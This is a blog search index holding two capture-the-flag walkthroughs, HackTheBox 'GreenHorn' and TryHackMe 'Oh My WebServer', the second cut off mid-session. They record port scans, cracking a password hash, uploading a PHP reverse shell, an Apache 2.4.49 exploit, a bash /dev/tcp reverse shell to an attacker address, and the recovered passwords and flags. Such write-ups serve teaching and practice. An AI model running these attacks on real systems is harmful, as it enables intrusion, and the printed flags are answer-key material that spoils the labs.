<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GreenHorn</title>
      <link href="/2024/07/31/GreenHorn/"/>
      <url>/2024/07/31/GreenHorn/</url>
      
        <content type="html"><![CDATA[<p><img src="/../greenhorn_img/0*GSGGmT-bgqHQ4mAu.png" alt="alt text"></p><p><strong>Target IP Address: 10.10.11.25</strong></p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.25</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 63</code></pre><h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul><li>command used:(scanning the ports we got)</li></ul><pre><code class="hljs bash">└─$ nmap -A -sC -sV -p22,80,3000 10.10.11.25 -Pn</code></pre><p>→ output:</p><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.25Host is up (0.051s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)80/tcp   open  http    nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://greenhorn.htb/3000/tcp open  ppp?| fingerprint-strings: |   GenericLines, Help, RTSPRequest: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain; charset=utf-8|     Connection: close|     Request|   GetRequest: |     HTTP/1.0 200 OK|     Cache-Control: max-age=0, private, must-revalidate, no-transform|     Content-Type: text/html; charset=utf-8|     Set-Cookie: i_like_gitea=e24c02bdee536e6d; Path=/; HttpOnly; SameSite=Lax|     Set-Cookie: _csrf=Ti3OYKLfauJV9M0okBeUZ4M8fO06MTcyMjIzMjY0OTExNjI2ODY2Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax|     X-Frame-Options: SAMEORIGIN|     Date: Mon, 29 Jul 2024 05:57:29 GMT|     &lt;!DOCTYPE html&gt;|     &lt;html lang=<span class="hljs-string">&quot;en-US&quot;</span> class=<span class="hljs-string">&quot;theme-auto&quot;</span>&gt;|     &lt;<span class="hljs-built_in">head</span>&gt;|     &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;|     &lt;title&gt;GreenHorn&lt;/title&gt;|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;manifest&quot;</span> href=<span class="hljs-string">&quot;data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX</span><span class="hljs-string">|   HTTPOptions: </span><span class="hljs-string">|     HTTP/1.0 405 Method Not Allowed</span><span class="hljs-string">|     Allow: HEAD</span><span class="hljs-string">|     Allow: HEAD</span><span class="hljs-string">|     Allow: GET</span><span class="hljs-string">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><span class="hljs-string">|     Set-Cookie: i_like_gitea=8d583b706b162120; Path=/; HttpOnly; SameSite=Lax</span><span class="hljs-string">|     Set-Cookie: _csrf=_iORjcp5oz4nR9JcSNTxSwaZWnc6MTcyMjIzMjY1NDQ0NjU5OTAzNw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><span class="hljs-string">|     X-Frame-Options: SAMEORIGIN</span><span class="hljs-string">|     Date: Mon, 29 Jul 2024 05:57:34 GMT</span><span class="hljs-string">|_    Content-Length: 0</span><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><span class="hljs-string">SF-Port3000-TCP:V=7.94SVN%I=7%D=7/29%Time=66A72F48%P=x86_64-pc-linux-gnu%r</span><span class="hljs-string">SF:(GenericLines,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\xSF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20BaSF:d\x20Request<span class="hljs-string">&quot;)%r(GetRequest,2A60,&quot;</span>HTTP/1\.0\x20200\x20OK\r\nCache-ContrSF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCoSF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitSF:ea=e24c02bdee536e6d;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-CooSF:kie:\x20_csrf=Ti3OYKLfauJV9M0okBeUZ4M8fO06MTcyMjIzMjY0OTExNjI2ODY2Mw;\xSF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-OptSF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2005:57:29\xSF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;theSF:me-auto\&quot;&gt;\n&lt;<span class="hljs-built_in">head</span>&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=devSF:ice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;title&gt;GreenHorn&lt;/title&gt;\n\t&lt;<span class="hljs-built_in">link</span>\xSF:20rel=\&quot;manifest\&quot;\x20href=\&quot;data:application/json;<span class="hljs-built_in">base64</span>,eyJuYW1lIjoiRSF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhSF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCSF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYSF:X<span class="hljs-string">&quot;)%r(Help,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tSF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\xSF:20Request<span class="hljs-string">&quot;)%r(HTTPOptions,1A4,&quot;</span>HTTP/1\.0\x20405\x20Method\x20Not\x20AllSF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-ContSF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSSF:et-Cookie:\x20i_like_gitea=8d583b706b162120;\x20Path=/;\x20HttpOnly;\x2SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=_iORjcp5oz4nR9JcSNTxSwaZWnc6MTcyMSF:jIzMjY1NDQ0NjU5OTAzNw;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SamSF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20JSF:ul\x202024\x2005:57:34\x20GMT\r\nContent-Length:\x200\r\n\r\n<span class="hljs-string">&quot;)%r(RTSPR</span><span class="hljs-string">SF:equest,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20ReSF:quest<span class="hljs-string">&quot;);</span><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs bash">└─$ nc -vn 10.10.11.25 22              (UNKNOWN) [10.10.11.25] 22 (ssh) openSSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">└─$ ssh root@10.10.11.25                                             The authenticity of host <span class="hljs-string">&#x27;10.10.11.25 (10.10.11.25)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:FrgpM50adTncJAsWACDugfF7duPzn9d6RzjZZFHNtLo.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? </span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80  (Default Port for HTTP)"></a>TCP 80  (Default Port for HTTP)</h3><p>Firstly we need to add the domain to &#x2F;etc&#x2F;hosts</p><ul><li><blockquote><p>Web Server:</p></blockquote></li></ul><pre><code class="hljs bash">curl -i http://greenhorn.htb | <span class="hljs-built_in">head</span> -n 50</code></pre><h3 id="Port-3000"><a href="#Port-3000" class="headerlink" title="Port 3000 -"></a>Port 3000 -</h3><p>Port 3000 is commonly used for various web development purposes and can be associated with different applications and protocols.</p><h1 id="Subdomain-Enumeration-with-wfuzz"><a href="#Subdomain-Enumeration-with-wfuzz" class="headerlink" title="Subdomain Enumeration with wfuzz"></a>Subdomain Enumeration with wfuzz</h1><p>Wfuzz was used for subdomain enumeration to identify hidden subdomains.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ wfuzz -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.greenhorn.htb&quot;</span> -u http://greenhorn.htb --hw 1053 --hl 7</code></pre><p>→ output:</p><ul><li>Didn’t find any subdomain</li></ul><h1 id="Directory-Busting-with-GoBuster"><a href="#Directory-Busting-with-GoBuster" class="headerlink" title="Directory Busting with GoBuster"></a>Directory Busting with GoBuster</h1><p>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://greenhorn.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -f -b 302</code></pre><p>→ output:</p><p><img src="/../greenhorn_img/1.png" alt="alt text"></p><p>I checked <strong>&#x2F;data</strong> but didn’t find anything</p><p><strong>After browsing for a little bit we find two interesting things:</strong></p><ul><li>if we click on admin we are being redirected to a login page</li><li>in the url we have a specific pattern that looks like <strong>Local File Inclusion</strong></li></ul><p>→</p><p><img src="/../greenhorn_img/2.png" alt="alt text"></p><p>Tried a local file inclusion and we get an interesting error <strong>a hacking attempt has been detected. For security reasons, we’re blocking any code execution.</strong></p><p>→</p><p><img src="/../greenhorn_img/3.png" alt="alt text"></p><p><strong>This didn’t work either, so let’s head into Port 3000</strong></p><p>We have a webapp:</p><p><img src="/../greenhorn_img/4.png" alt="alt text"></p><p>Let’s enumerate the directories:</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://greenhorn.htb:3000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50</code></pre><p>→ output:</p><pre><code class="hljs bash">Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode===============================================================/admin                (Status: 303) [Size: 38] [--&gt; /user/login]/issues               (Status: 303) [Size: 38] [--&gt; /user/login]/test                 (Status: 200) [Size: 16511]/v2                   (Status: 401) [Size: 50]/explore              (Status: 303) [Size: 41] [--&gt; /explore/repos]/milestones           (Status: 303) [Size: 38] [--&gt; /user/login]/notifications        (Status: 303) [Size: 38] [--&gt; /user/login]</code></pre><p>I went to crawl on the website and found something interesting in <strong>&#x2F;explore&#x2F;repos</strong></p><p>→</p><p><img src="/../greenhorn_img/5.png" alt="alt text"></p><p>GreenAdmin’s repository hmm..</p><p>→ </p><p><img src="/../greenhorn_img/6.png" alt="alt text"></p><p>When a user submit’s in the login page, the script hashes the password in SHA-512 and stores it in the <code>$pass</code> , the script then compares the hashed value in <strong>$pass</strong> with the value in <strong>$ww</strong></p><p>→</p><p><img src="/../greenhorn_img/7.png" alt="alt text"></p><p>We searched around and if we go on <strong>&#x2F;data&#x2F;settings&#x2F;pass.php</strong> we find a hashes password</p><p>→ </p><p><img src="/../greenhorn_img/8.png" alt="alt text"></p><p>Hash: </p><pre><code class="hljs bash">**<span class="hljs-string">&#x27;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163’**</span></code></pre><p><strong>Store the hash into a file <code>hash.txt</code> and then we will use john to crack the hash</strong> </p><p>→ John the Ripper is used in a penetration test to crack password hashes and identify weak or compromised passwords.</p><ul><li>command used:(we added the format sha512 because we already know this)</li></ul><pre><code class="hljs bash">└─$ john hash.txt --format=raw-sha512 -w=/usr/share/wordlists/rockyou.txt</code></pre><p>→ output:</p><pre><code class="hljs bash">Using default input encoding: UTF-8Loaded 1 password <span class="hljs-built_in">hash</span> (Raw-SHA512 [SHA512 256/256 AVX2 4x])Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4Will run 4 OpenMP threadsPress <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> statusiloveyou1        (?)     1g 0:00:00:00 DONE (2024-07-29 02:47) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..ooooooUse the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliablySession completed.</code></pre><p>Pass: <code>iloveyou1</code></p><p>We used this password to login in the &#x2F;login page and it worked:</p><p><img src="/../greenhorn_img/9.png" alt="alt text"></p><p>We tried adding a php-reverse-shell.php but unfortunately it didn’t work because after we upload the php it automatically adds <code>.txt</code> extension to the file</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Go into options &gt; manage modules → install a module and upload a reverse shell with .zip extension </p><ul><li>command to make the reverse shell with .zip format:</li></ul><pre><code class="hljs bash">└─$ zip php-reverse-shell.zip php-reverse-shell.php</code></pre><p>Upload it in the location i just mentioned, but before that start a netcat with the specific port and boom we got shell access:</p><p>→</p><p><img src="/../greenhorn_img/10.png" alt="alt text"></p><p>Spawning a <strong>&#x2F;bin&#x2F;bash</strong> shell using Python3:</p><ul><li>command used:</li></ul><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></code></pre><p>We found a user named junior:</p><p><img src="/../greenhorn_img/11.png" alt="alt text"></p><p>After some wasted time i was surprised to find that the password we used to login to Pluck is the same password for junior</p><p>→ output:</p><p><img src="/../greenhorn_img/12.png" alt="alt text"></p><p>→</p><pre><code class="hljs bash">junior@greenhorn:/home/junior<span class="hljs-comment"># cat user.txt</span><span class="hljs-built_in">cat</span> user.txt22f5f41ed3ee036568752125b9f67921</code></pre><p>User.txt Flag: <code>22f5f41ed3ee036568752125b9f67921</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p><strong>LinPEAS</strong> is a script used in penetration testing to automate the process of enumerating possible paths to escalate privileges on a Linux system.</p><p><strong>Uploading LinPEAS to the victim’s machine:</strong></p><pre><code class="hljs bash">python3 -m http.serverwget http://10.10.14.41:8000/linpeas.sh<span class="hljs-built_in">chmod</span> +x linpeas.sh</code></pre><p><strong>LinPEAS</strong> finds: </p><p><img src="/../greenhorn_img/13.png" alt="alt text"></p><p>This was just a rabbit hole what i needed to do was right in my face → go to &#x2F;home → &#x2F;junior and we have a file named <code>Using OpenVAS.pdf</code></p><p><img src="/../greenhorn_img/14.png" alt="alt text"></p><p>Upload this file to our machine just like we did it with linpeas and open it:</p><p>→ </p><p><img src="/../greenhorn_img/15.png" alt="alt text"></p><p>Let’s convert it using <code>pdfimages</code> </p><ul><li>commands used:</li></ul><pre><code class="hljs bash">pdfimages <span class="hljs-string">&quot;./Using OpenVAS.pdf&quot;</span> greenhornopen greenhorn-000.ppm</code></pre><p>It’s a pixelated image but no worries there’s a tool just for this called <code>Depix</code>:</p><p><img src="/../greenhorn_img/16.png" alt="alt text"></p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ python3 depix.py -p /home/kali/Desktop/Workspace/TryHackMe/greenhorn-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o /home/kali/Desktop/Workspace/TryHackMe/output0.png</code></pre><p><img src="/../greenhorn_img/17.png" alt="alt text"></p><p>I guess that’s the root password let’s try it:</p><p><img src="/../greenhorn_img/18.png" alt="alt text"></p><p>Pass: <code>sidefromsidetheothersidesidefromsidetheotherside</code></p><p>→ </p><pre><code class="hljs bash">root@greenhorn:~<span class="hljs-comment"># cat root.txt</span><span class="hljs-built_in">cat</span> root.txt7eb9b4cefe32a614896f68bafa9e7067</code></pre><p>Root Flag.txt: <code>7eb9b4cefe32a614896f68bafa9e7067</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oh My WebServer</title>
      <link href="/2024/07/31/Oh-My-WebServer/"/>
      <url>/2024/07/31/Oh-My-WebServer/</url>
      
        <content type="html"><![CDATA[<p>Target IP Address: 10.10.242.41</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used: (scanning for all ports fast and efficient)</li></ul><pre><code class="hljs bash">└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.242.41</code></pre><p>→ output:</p><pre><code class="hljs bash">Host is up, received user-set (0.082s latency).Scanned at 2024-05-27 11:32:19 EDT <span class="hljs-keyword">for</span> 26sNot shown: 65533 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 62Read data files from: /usr/bin/../share/nmapNmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.65 seconds           Raw packets sent: 131088 (5.768MB) | Rcvd: 22 (968B)</code></pre><h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><ul><li>command used: ( scanning the ports we got )</li></ul><pre><code class="hljs bash">└─$ nmap -A -sC -sV -p22,80 10.10.242.41 -Pn</code></pre><p>→ output:</p><pre><code class="hljs bash">Host is up (0.074s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)|_  256 d1:63:2a:36:<span class="hljs-built_in">dd</span>:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)80/tcp open  http    Apache httpd 2.4.49 ((Unix))| http-methods: |_  Potentially risky methods: TRACE|_http-title: Consult - Business Consultancy Agency Template | Home|_http-server-header: Apache/2.4.49 (Unix)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs bash">nc -vn 10.10.242.41 22</code></pre><p>→ output:</p><pre><code class="hljs bash">└─$ nc -vn 10.10.242.41 22(UNKNOWN) [10.10.242.41] 22 (ssh) openSSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.10.242.41</code></pre><p>→ output:</p><pre><code class="hljs bash">└─$ ssh root@10.10.242.41The authenticity of host <span class="hljs-string">&#x27;10.10.242.41 (10.10.242.41)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:9ru28sBHRllPgsckS0CPU0Er77YnxIOdkbJDLhcVoaQ.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><p>→ WebServer:</p><pre><code class="hljs bash">curl -i http://10.10.242.41 | <span class="hljs-built_in">head</span> -n 50</code></pre><p>→ output:</p><pre><code class="hljs bash">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OKDate: Mon, 27 May 2024 15:37:18 GMTServer: Apache/2.4.49 (Unix)Last-Modified: Wed, 23 Feb 2022 05:40:45 GMTETag: <span class="hljs-string">&quot;e281-5d8a8e82e3140&quot;</span>Accept-Ranges: bytesContent-Length: 57985Content-Type: text/html&lt;!doctype html&gt;&lt;html class=<span class="hljs-string">&quot;no-js&quot;</span> lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;        &lt;!--====== Title ======--&gt;    &lt;title&gt;Consult - Business Consultancy Agency Template | Home&lt;/title&gt;        &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>&gt;    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;    &lt;!--====== Favicon Icon ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;shortcut icon&quot;</span> href=<span class="hljs-string">&quot;assets/images/favicon.png&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image/png&quot;</span>&gt;            &lt;!--====== Slick CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/slick.css&quot;</span>&gt;            &lt;!--====== Font Awesome CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/font-awesome.min.css&quot;</span>&gt;            &lt;!--====== Line Icons CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/LineIcons.css&quot;</span>&gt;            &lt;!--====== Animate CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/animate.css&quot;</span>&gt;            &lt;!--====== Magnific Popup CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/magnific-popup.css&quot;</span>&gt;            &lt;!--====== Bootstrap CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/bootstrap.min.css&quot;</span>&gt;        &lt;!--====== Default CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/default.css&quot;</span>&gt;        &lt;!--====== Style CSS ======--&gt;    &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;assets/css/style.css&quot;</span>&gt;    &lt;/head&gt;</code></pre><h2 id="Directory-Busting-with-GoBuster"><a href="#Directory-Busting-with-GoBuster" class="headerlink" title="Directory Busting with GoBuster"></a>Directory Busting with GoBuster</h2><p><strong>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</strong></p><ul><li>command:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.242.41/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ output:</p><pre><code class="hljs bash">Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.242.41/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode===============================================================/assets               (Status: 301) [Size: 235] [--&gt; http://10.10.242.41/assets/]</code></pre><p>Found &#x2F;<strong>assets</strong></p><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/6f68d33f-6ab8-44bc-9167-d03c4dbdb250/e674e0d7-5e41-4aea-9a5e-a9ec5df34797/Untitled.png" alt="Untitled"></p><h1 id="Vulnerability-Assessment"><a href="#Vulnerability-Assessment" class="headerlink" title="Vulnerability Assessment"></a>Vulnerability Assessment</h1><h2 id="Searching-for-exploits-Apache-httpd-2-4-49"><a href="#Searching-for-exploits-Apache-httpd-2-4-49" class="headerlink" title="Searching for exploits (Apache httpd 2.4.49)"></a>Searching for exploits (Apache httpd 2.4.49)</h2><ul><li><a href="https://www.exploit-db.com/exploits/50383">https://www.exploit-db.com/exploits/50383</a></li></ul><p>Create a file <code>target.txt</code> with the IP → Copy the exploit and name the file <a href="http://poc.sh/"><code>poc.sh</code></a> → run it using the following command:</p><pre><code class="hljs bash">bash poc.sh targets.txt /bin/sh <span class="hljs-built_in">whoami</span></code></pre><p>→ output:</p><pre><code class="hljs bash">10.10.136.172daemon</code></pre><h2 id="Gaining-Initial-Access"><a href="#Gaining-Initial-Access" class="headerlink" title="Gaining Initial Access"></a>Gaining Initial Access</h2><p>Now what we have is an example of a command execution.</p><p>→ Get a shell on the system</p><ul><li>command:</li></ul><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/machine ip/6666 0&gt;&amp;1&#x27;</span></code></pre><p>But first before we run this start a netcat listener on port 6666:</p><pre><code class="hljs bash">nc -lvnp 6666</code></pre><ul><li>Full command:</li></ul><pre><code class="hljs bash">└─$ bash poc.sh targets.txt /bin/sh <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.9.3.177/6666 0&gt;&amp;1&#x27;&quot;</span></code></pre><p>→ Netcat listener output: (we got shell)</p><pre><code class="hljs bash">└─$ nc -lvnp 6666listening on [any] 6666 ...connect to [10.9.3.177] from (UNKNOWN) [10.10.136.172] 32810bash: cannot <span class="hljs-built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="hljs-keyword">for</span> devicebash: no job control <span class="hljs-keyword">in</span> this shelldaemon@4a70924bafa0:/bin$</code></pre><h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h1><h2 id="Exploring-the-System"><a href="#Exploring-the-System" class="headerlink" title="Exploring the System"></a>Exploring the System</h2><p>Go to <code>/</code> </p><p>→</p><pre><code class="hljs bash">daemon@4a70924bafa0:/bin$ 